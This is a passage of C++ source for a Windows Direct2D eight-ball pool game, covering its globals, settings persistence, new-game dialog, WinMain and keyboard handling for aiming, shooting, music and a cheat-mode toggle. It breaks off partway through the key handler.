    bool isDraggingCueBall = false;
    // --- ENSURE THIS LINE EXISTS HERE ---
    bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
    // --- End Ensure ---
    bool isSettingEnglish = false;
    D2D1_POINT_2F aimStartPoint = { 0, 0 };
    float cueAngle = 0.0f;
    float shotPower = 0.0f;
    float cueSpinX = 0.0f; // Range -1 to 1
    float cueSpinY = 0.0f; // Range -1 to 1
    float pocketFlashTimer = 0.0f;
    bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
    int draggingBallId = -1;
    bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power
    MCIDEVICEID midiDeviceID = 0; //midi func
    std::atomic<bool> isMusicPlaying(false); //midi func
    std::thread musicThread; //midi func
    void StartMidi(HWND hwnd, const TCHAR* midiPath);
    void StopMidi();

    // UI Element Positions
    D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
    D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
    D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
    float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
    D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

    // Corrected Pocket Center Positions (aligned with table corners/edges)
    const D2D1_POINT_2F pocketPositions[6] = {
        {TABLE_LEFT, TABLE_TOP},                           // Top-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
        {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
        {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
        {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
    };

    // Colors
    const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.1608f, 0.4000f, 0.1765f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    //const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF(0.3608f, 0.0275f, 0.0078f)); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    //const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
    const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Goldenrod); // Solids = Yellow Goldenrod
    const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::DarkOrchid);   // Stripes = Red DarkOrchid
    const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
    const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(0.1333f, 0.7294f, 0.7490f); //NEWCOLOR 0.1333f, 0.7294f, 0.7490f => ::Blue
    //const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
    const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

    // --- Forward Declarations ---
    HRESULT CreateDeviceResources();
    void DiscardDeviceResources();
    void OnPaint();
    void OnResize(UINT width, UINT height);
    void InitGame();
    void GameUpdate();
    void UpdatePhysics();
    void CheckCollisions();
    bool CheckPockets(); // Returns true if any ball was pocketed
    void ProcessShotResults();
    void ApplyShot(float power, float angle, float spinX, float spinY);
    void RespawnCueBall(bool behindHeadstring);
    bool AreBallsMoving();
    void SwitchTurns();
    //bool AssignPlayerBallTypes(BallType firstPocketedType);
    bool AssignPlayerBallTypes(BallType firstPocketedType,
        bool creditShooter = true);
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
    Ball* GetBallById(int id);
    Ball* GetCueBall();
    //void PlayGameMusic(HWND hwnd); //midi func
    void AIBreakShot();

    // Drawing Functions
    void DrawScene(ID2D1RenderTarget* pRT);
    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory);
    void DrawBalls(ID2D1RenderTarget* pRT);
    void DrawCueStick(ID2D1RenderTarget* pRT);
    void DrawAimingAids(ID2D1RenderTarget* pRT);
    void DrawUI(ID2D1RenderTarget* pRT);
    void DrawPowerMeter(ID2D1RenderTarget* pRT);
    void DrawSpinIndicator(ID2D1RenderTarget* pRT);
    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);
    // NEW
    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT);

    // Helper Functions
    float GetDistance(float x1, float y1, float x2, float y2);
    float GetDistanceSq(float x1, float y1, float x2, float y2);
    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
    template <typename T> void SafeRelease(T** ppT);
    // --- NEW HELPER FORWARD DECLARATIONS ---
    bool IsPlayerOnEightBall(int player);
    void CheckAndTransitionToPocketChoice(int playerID);
    // --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
    // --- End Forward Declaration ---
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

    // --- NEW Forward Declarations ---

    // AI Related
    struct AIShotInfo; // Define below
    void TriggerAIMove();
    void AIMakeDecision();
    void AIPlaceCueBall();
    AIShotInfo AIFindBestShot();
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
    bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
    Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
    bool IsValidAIAimAngle(float angle); // Basic check

    // Dialog Related
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
    void ShowNewGameDialog(HINSTANCE hInstance);
    void LoadSettings(); // For deserialization
    void SaveSettings(); // For serialization
    const std::wstring SETTINGS_FILE_NAME = L""Pool-Settings.txt"";
    void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

    // --- Forward Declaration for Window Procedure --- <<< Add this line HERE
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

    // --- NEW Struct for AI Shot Evaluation ---
    struct AIShotInfo {
        bool possible = false;          // Is this shot considered viable?
        Ball* targetBall = nullptr;     // Which ball to hit
        int pocketIndex = -1;           // Which pocket to aim for (0-5)
        D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
        float angle = 0.0f;             // Calculated shot angle
        float power = 0.0f;             // Calculated shot power
        float score = -1.0f;            // Score for this shot (higher is better)
        bool involves8Ball = false;     // Is the target the 8-ball?
        float spinX = 0.0f;
        float spinY = 0.0f;
    };

    /*
    table = TABLE_COLOR new: #29662d (0.1608, 0.4000, 0.1765) => old: (0.0f, 0.5f, 0.1f)
    rail CUSHION_COLOR = #5c0702 (0.3608, 0.0275, 0.0078) => ::Red
    gap = #e99d33 (0.9157, 0.6157, 0.2000) => ::Orange
    winbg = #5e8863 (0.3686, 0.5333, 0.3882) => 1.0f, 1.0f, 0.803f
    headstring = #47742f (0.2784, 0.4549, 0.1843) => ::White
    bluearrow = #08b0a5 (0.0314, 0.6902, 0.6471) *#22babf (0.1333,0.7294,0.7490) => ::Blue
    */

    // --- NEW Settings Serialization Functions ---
    void SaveSettings() {
        std::ofstream outFile(SETTINGS_FILE_NAME);
        if (outFile.is_open()) {
            outFile << static_cast<int>(gameMode) << std::endl;
            outFile << static_cast<int>(aiDifficulty) << std::endl;
            outFile << static_cast<int>(openingBreakMode) << std::endl;
            outFile.close();
        }
        // else: Handle error, e.g., log or silently fail
    }

    void LoadSettings() {
        std::ifstream inFile(SETTINGS_FILE_NAME);
        if (inFile.is_open()) {
            int gm, aid, obm;
            if (inFile >> gm) {
                gameMode = static_cast<GameMode>(gm);
            }
            if (inFile >> aid) {
                aiDifficulty = static_cast<AIDifficulty>(aid);
            }
            if (inFile >> obm) {
                openingBreakMode = static_cast<OpeningBreakMode>(obm);
            }
            inFile.close();

            // Validate loaded settings (optional, but good practice)
            if (gameMode < HUMAN_VS_HUMAN || gameMode > HUMAN_VS_AI) gameMode = HUMAN_VS_HUMAN; // Default
            if (aiDifficulty < EASY || aiDifficulty > HARD) aiDifficulty = MEDIUM; // Default
            if (openingBreakMode < CPU_BREAK || openingBreakMode > FLIP_COIN_BREAK) openingBreakMode = CPU_BREAK; // Default
        }
        // else: File doesn't exist or couldn't be opened, use defaults (already set in global vars)
    }
    // --- End Settings Serialization Functions ---

    // --- NEW Dialog Procedure ---
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
        switch (message) {
        case WM_INITDIALOG:
        {
            // --- ACTION 4: Center Dialog Box ---
    // Optional: Force centering if default isn't working
            RECT rcDlg, rcOwner, rcScreen;
            HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
            if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

            GetWindowRect(hwndOwner, &rcOwner);
            GetWindowRect(hDlg, &rcDlg);
            CopyRect(&rcScreen, &rcOwner); // Use owner rect as reference bounds

            // Offset the owner rect relative to the screen if it's not the desktop
            if (GetParent(hDlg) != NULL) { // If parented to main window (passed to DialogBoxParam)
                OffsetRect(&rcOwner, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcDlg, -rcScreen.left, -rcScreen.top);
                OffsetRect(&rcScreen, -rcScreen.left, -rcScreen.top);
            }


            // Calculate centered position
            int x = rcOwner.left + (rcOwner.right - rcOwner.left - (rcDlg.right - rcDlg.left)) / 2;
            int y = rcOwner.top + (rcOwner.bottom - rcOwner.top - (rcDlg.bottom - rcDlg.top)) / 2;

            // Ensure it stays within screen bounds (optional safety)
            x = std::max(static_cast<int>(rcScreen.left), x);
            y = std::max(static_cast<int>(rcScreen.top), y);
            if (x + (rcDlg.right - rcDlg.left) > rcScreen.right)
                x = rcScreen.right - (rcDlg.right - rcDlg.left);
            if (y + (rcDlg.bottom - rcDlg.top) > rcScreen.bottom)
                y = rcScreen.bottom - (rcDlg.bottom - rcDlg.top);


            // Set the dialog position
            SetWindowPos(hDlg, HWND_TOP, x, y, 0, 0, SWP_NOSIZE);

            // --- End Centering Code ---

            // Set initial state based on current global settings (or defaults)
            CheckRadioButton(hDlg, IDC_RADIO_2P, IDC_RADIO_CPU, (gameMode == HUMAN_VS_HUMAN) ? IDC_RADIO_2P : IDC_RADIO_CPU);

            CheckRadioButton(hDlg, IDC_RADIO_EASY, IDC_RADIO_HARD,
                (aiDifficulty == EASY) ? IDC_RADIO_EASY : ((aiDifficulty == MEDIUM) ? IDC_RADIO_MEDIUM : IDC_RADIO_HARD));

            // Enable/Disable AI group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), gameMode == HUMAN_VS_AI);
            // Set initial state for Opening Break Mode
            CheckRadioButton(hDlg, IDC_RADIO_CPU_BREAK, IDC_RADIO_FLIP_BREAK,
                (openingBreakMode == CPU_BREAK) ? IDC_RADIO_CPU_BREAK : ((openingBreakMode == P1_BREAK) ? IDC_RADIO_P1_BREAK : IDC_RADIO_FLIP_BREAK));
            // Enable/Disable Opening Break group based on initial mode
            EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), gameMode == HUMAN_VS_AI);
            EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), gameMode == HUMAN_VS_AI);
        }
        return (INT_PTR)TRUE;

        case WM_COMMAND:
            switch (LOWORD(wParam)) {
            case IDC_RADIO_2P:
            case IDC_RADIO_CPU:
            {
                bool isCPU = IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED;
                // Enable/Disable AI group controls based on selection
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_AI), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_EASY), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_MEDIUM), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_HARD), isCPU);
                // Also enable/disable Opening Break Mode group
                EnableWindow(GetDlgItem(hDlg, IDC_GROUP_BREAK_MODE), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_CPU_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_P1_BREAK), isCPU);
                EnableWindow(GetDlgItem(hDlg, IDC_RADIO_FLIP_BREAK), isCPU);
            }
            return (INT_PTR)TRUE;

            case IDOK:
                // Retrieve selected options and store in global variables
                if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU) == BST_CHECKED) {
                    gameMode = HUMAN_VS_AI;
                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_EASY) == BST_CHECKED) aiDifficulty = EASY;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_MEDIUM) == BST_CHECKED) aiDifficulty = MEDIUM;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_HARD) == BST_CHECKED) aiDifficulty = HARD;

                    if (IsDlgButtonChecked(hDlg, IDC_RADIO_CPU_BREAK) == BST_CHECKED) openingBreakMode = CPU_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_P1_BREAK) == BST_CHECKED) openingBreakMode = P1_BREAK;
                    else if (IsDlgButtonChecked(hDlg, IDC_RADIO_FLIP_BREAK) == BST_CHECKED) openingBreakMode = FLIP_COIN_BREAK;
                }
                else {
                    gameMode = HUMAN_VS_HUMAN;
                    // openingBreakMode doesn't apply to HvsH, can leave as is or reset
                }
                SaveSettings(); // Save settings when OK is pressed
                EndDialog(hDlg, IDOK); // Close dialog, return IDOK
                return (INT_PTR)TRUE;

            case IDCANCEL: // Handle Cancel or closing the dialog
                // Optionally, could reload settings here if you want cancel to revert to previously saved state
                EndDialog(hDlg, IDCANCEL);
                return (INT_PTR)TRUE;
            }
            break; // End WM_COMMAND
        }
        return (INT_PTR)FALSE; // Default processing
    }

    // --- NEW Helper to Show Dialog ---
    void ShowNewGameDialog(HINSTANCE hInstance) {
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), hwndMain, NewGameDialogProc, 0) == IDOK) {
            // User clicked Start, reset game with new settings
            isPlayer2AI = (gameMode == HUMAN_VS_AI); // Update AI flag
            if (isPlayer2AI) {
                switch (aiDifficulty) {
                case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
                case MEDIUM: player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
                case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
                }
            }
            else {
                player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
            }
            // Update window title
            std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
            if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
            else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";
            SetWindowText(hwndMain, windowTitle.c_str());

            InitGame(); // Re-initialize game logic & board
            InvalidateRect(hwndMain, NULL, TRUE); // Force redraw
        }
        else {
            // User cancelled dialog - maybe just resume game? Or exit?
            // For simplicity, we do nothing, game continues as it was.
            // To exit on cancel from F2, would need more complex state management.
        }
    }

    // --- NEW Reset Game Function ---
    void ResetGame(HINSTANCE hInstance) {
        // Call the helper function to show the dialog and re-init if OK clicked
        ShowNewGameDialog(hInstance);
    }

    // --- WinMain ---
    int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int nCmdShow) {
        if (FAILED(CoInitialize(NULL))) {
            MessageBox(NULL, L""COM Initialization Failed."", L""Error"", MB_OK | MB_ICONERROR);
            return -1;
        }

        // --- NEW: Load settings at startup ---
        LoadSettings();

        // --- NEW: Show configuration dialog FIRST ---
        if (DialogBoxParam(hInstance, MAKEINTRESOURCE(IDD_NEWGAMEDLG), NULL, NewGameDialogProc, 0) != IDOK) {
            // User cancelled the dialog
            CoUninitialize();
            return 0; // Exit gracefully if dialog cancelled
        }
        // Global gameMode and aiDifficulty are now set by the DialogProc

        // Set AI flag based on game mode
        isPlayer2AI = (gameMode == HUMAN_VS_AI);
        if (isPlayer2AI) {
            switch (aiDifficulty) {
            case EASY: player2Info.name = L""Virtus Pro (Easy)""/*""CPU (Easy)""*/; break;
            case MEDIUM:player2Info.name = L""Virtus Pro (Medium)""/*""CPU (Medium)""*/; break;
            case HARD: player2Info.name = L""Virtus Pro (Hard)""/*""CPU (Hard)""*/; break;
            }
        }
        else {
            player2Info.name = L""Billy Ray Cyrus""/*""Player 2""*/;
        }
        // --- End of Dialog Logic ---


        WNDCLASS wc = { };
        wc.lpfnWndProc = WndProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/;
        wc.hCursor = LoadCursor(NULL, IDC_ARROW);
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
        wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1)); // Use your actual icon ID here

        if (!RegisterClass(&wc)) {
            MessageBox(NULL, L""Window Registration Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // --- ACTION 4: Calculate Centered Window Position ---
        const int WINDOW_WIDTH = 1000; // Define desired width
        const int WINDOW_HEIGHT = 700; // Define desired height
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        int windowX = (screenWidth - WINDOW_WIDTH) / 2;
        int windowY = (screenHeight - WINDOW_HEIGHT) / 2;

        // --- Change Window Title based on mode ---
        std::wstring windowTitle = L""Midnight Pool 4""/*""Direct2D 8-Ball Pool""*/;
        if (gameMode == HUMAN_VS_HUMAN) windowTitle += L"" (Human vs Human)"";
        else windowTitle += L"" (Human vs "" + player2Info.name + L"")"";

        DWORD dwStyle = WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX; // No WS_THICKFRAME, No WS_MAXIMIZEBOX

        hwndMain = CreateWindowEx(
            0, L""BLISS_GameEngine""/*""Direct2D_8BallPool""*/, windowTitle.c_str(), dwStyle,
            windowX, windowY, WINDOW_WIDTH, WINDOW_HEIGHT,
            NULL, NULL, hInstance, NULL
        );

        if (!hwndMain) {
            MessageBox(NULL, L""Window Creation Failed."", L""Error"", MB_OK | MB_ICONERROR);
            CoUninitialize();
            return -1;
        }

        // Initialize Direct2D Resources AFTER window creation
        if (FAILED(CreateDeviceResources())) {
            MessageBox(NULL, L""Failed to create Direct2D resources."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        InitGame(); // Initialize game state AFTER resources are ready & mode is set
        Sleep(500); // Allow window to fully initialize before starting the countdown //midi func
        StartMidi(hwndMain, TEXT(""BSQ.MID"")); // Replace with your MIDI filename
        //PlayGameMusic(hwndMain); //midi func

        ShowWindow(hwndMain, nCmdShow);
        UpdateWindow(hwndMain);

        if (!SetTimer(hwndMain, ID_TIMER, 1000 / TARGET_FPS, NULL)) {
            MessageBox(NULL, L""Could not SetTimer()."", L""Error"", MB_OK | MB_ICONERROR);
            DestroyWindow(hwndMain);
            CoUninitialize();
            return -1;
        }

        MSG msg = { };
        // --- Modified Main Loop ---
        // Handles the case where the game starts in SHOWING_DIALOG state (handled now before loop)
        // or gets reset to it via F2. The main loop runs normally once game starts.
        while (GetMessage(&msg, NULL, 0, 0)) {
            // We might need modeless dialog handling here if F2 shows dialog
            // while window is active, but DialogBoxParam is modal.
            // Let's assume F2 hides main window, shows dialog, then restarts game loop.
            // Simpler: F2 calls ResetGame which calls DialogBoxParam (modal) then InitGame.
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        KillTimer(hwndMain, ID_TIMER);
        DiscardDeviceResources();
        SaveSettings(); // Save settings on exit
        CoUninitialize();

        return (int)msg.wParam;
    }

    // --- WndProc ---
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
        // Declare cueBall pointer once at the top, used in multiple cases
        // For clarity, often better to declare within each case where needed.
        Ball* cueBall = nullptr; // Initialize to nullptr
        switch (msg) {
        case WM_CREATE:
            // Resources are now created in WinMain after CreateWindowEx
            return 0;

        case WM_PAINT:
            OnPaint();
            // Validate the entire window region after painting
            ValidateRect(hwnd, NULL);
            return 0;

        case WM_SIZE: {
            UINT width = LOWORD(lParam);
            UINT height = HIWORD(lParam);
            OnResize(width, height);
            return 0;
        }

        case WM_TIMER:
            if (wParam == ID_TIMER) {
                GameUpdate(); // Update game logic and physics
                InvalidateRect(hwnd, NULL, FALSE); // Request redraw
            }
            return 0;

            // --- NEW: Handle F2 Key for Reset ---
            // --- MODIFIED: Handle More Keys ---
        case WM_KEYDOWN:
        { // Add scope for variable declarations

            // --- FIX: Get Cue Ball pointer for this scope ---
            cueBall = GetCueBall();
            // We might allow some keys even if cue ball is gone (like F1/F2), but actions need it
            // --- End Fix ---

            // Check which player can interact via keyboard (Humans only)
            bool canPlayerControl = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P1 || currentGameState == PRE_BREAK_PLACEMENT)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT)));

            // --- F1 / F2 Keys (Always available) ---
            if (wParam == VK_F2) {
                HINSTANCE hInstance = (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE);
                ResetGame(hInstance); // Call reset function
                return 0; // Indicate key was processed
            }
            else if (wParam == VK_F1) {
                MessageBox(hwnd,
                    L""Direct2D-based StickPool game made in C++ from scratch (4827+ lines of code)\n"" // Update line count if needed {2764+ lines}
                    L""First successful Clone in C++ (no other sites or projects were there to glean from.) Made /w AI assist\n""
                    L""(others were in JS/ non-8-Ball in C# etc.) w/o OOP and Graphics Frameworks all in a Single file.\n""
                    L""Copyright (C) 2025 Evans Thorpemorton, Entisoft Solutions.\n""
                    L""Includes AI Difficulty Modes, Aim-Trajectory For Table Rails + Hard Angles TipShots. || F2=New Game"",
                    L""About This Game"", MB_OK | MB_ICONINFORMATION);
                return 0; // Indicate key was processed
            }

            // Check for 'M' key (uppercase or lowercase)
                // Toggle music with ""M""
            if (wParam == 'M' || wParam == 'm') {
                //static bool isMusicPlaying = false;
                if (isMusicPlaying) {
                    // Stop the music
                    StopMidi();
                    isMusicPlaying = false;
                }
                else {
                    // Build the MIDI file path
                    TCHAR midiPath[MAX_PATH];
                    GetModuleFileName(NULL, midiPath, MAX_PATH);
                    // Keep only the directory part
                    TCHAR* lastBackslash = _tcsrchr(midiPath, '\\');
                    if (lastBackslash != NULL) {
                        *(lastBackslash + 1) = '\0';
                    }
                    // Append the MIDI filename
                    _tcscat_s(midiPath, MAX_PATH, TEXT(""BSQ.MID"")); // Adjust filename if needed

                    // Start playing MIDI
                    StartMidi(hwndMain, midiPath);
                    isMusicPlaying = true;
                }
            }


            // --- Player Interaction Keys (Only if allowed) ---
            if (canPlayerControl) {
                // --- Get Shift Key State ---
                bool shiftPressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                float angleStep = shiftPressed ? 0.05f : 0.01f; // Base step / Faster step (Adjust as needed) // Multiplier was 5x
                float powerStep = 0.2f; // Power step (Adjust as needed)

                switch (wParam) {
                case VK_LEFT: // Rotate Cue Stick Counter-Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle -= angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle < 0) cueAngle += 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_RIGHT: // Rotate Cue Stick Clockwise
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        cueAngle += angleStep;
                        // Normalize angle (keep between 0 and 2*PI)
                        if (cueAngle >= 2 * PI) cueAngle -= 2 * PI;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_UP: // Decrease Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower -= powerStep;
                        if (shotPower < 0.0f) shotPower = 0.0f;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true; // Keyboard adjust doesn't use mouse aiming state
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_DOWN: // Increase Shot Power
                    if (currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING) {
                        shotPower += powerStep;
                        if (shotPower > MAX_SHOT_POWER) shotPower = MAX_SHOT_POWER;
                        // Ensure state shows aiming visuals if turn just started
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN) currentGameState = AIMING;
                        isAiming = true;
                        isDraggingStick = false;
                        keyboardAimingActive = true;
                    }
                    break;

                case VK_SPACE: // Trigger Shot
                    if ((currentGameState == AIMING || currentGameState == BREAKING || currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        && currentGameState != SHOT_IN_PROGRESS && currentGameState != AI_THINKING)
                    {
                        if (shotPower > 0.15f) { // Use same threshold as mouse
                           // Reset foul flags BEFORE applying shot
                            firstHitBallIdThisShot = -1;
                            cueHitObjectBallThisShot = false;
                            railHitAfterContact = false;

                            // Play sound & Apply Shot
                            std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                            ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);

                            // Update State
                            currentGameState = SHOT_IN_PROGRESS;
                            foulCommitted = false;
                            pocketedThisTurn.clear();
                            shotPower = 0; // Reset power after shooting
                            isAiming = false; isDraggingStick = false; // Reset aiming flags
                            keyboardAimingActive = false;
                        }
                    }
                    break;

                case VK_ESCAPE: // Cancel Aim/Shot Setup
                    if ((currentGameState == AIMING || currentGameState == BREAKING) || shotPower > 0)
                    {
                        shotPower = 0.0f;
                        isAiming = false;
                        isDraggingStick = false;
                        keyboardAimingActive = false;
                        // Revert to basic turn state if not breaking
                        if (currentGameState != BREAKING) {
                            currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        }
                        //if (currentPlayer == 1) calledPocketP1 = -1;
                        //else                  calledPocketP2 = -1;
                    }
                    break;

                case 'G': // Toggle Cheat Mode
                    cheatModeEnabled = !cheatModeEnabled;
                    if (cheatModeEnabled)
                        MessageBeep(MB_ICONEXCLAMATION); // Play a beep when enabling
                    else
                        MessageBeep(MB_OK); // Play a different beep when disabling
                    break;

                default:
                    // Allow default processing for other keys if needed
                    // return DefWindowProc(hwnd, msg, wParam, lParam); // Usually not needed for WM_KEYDOWN
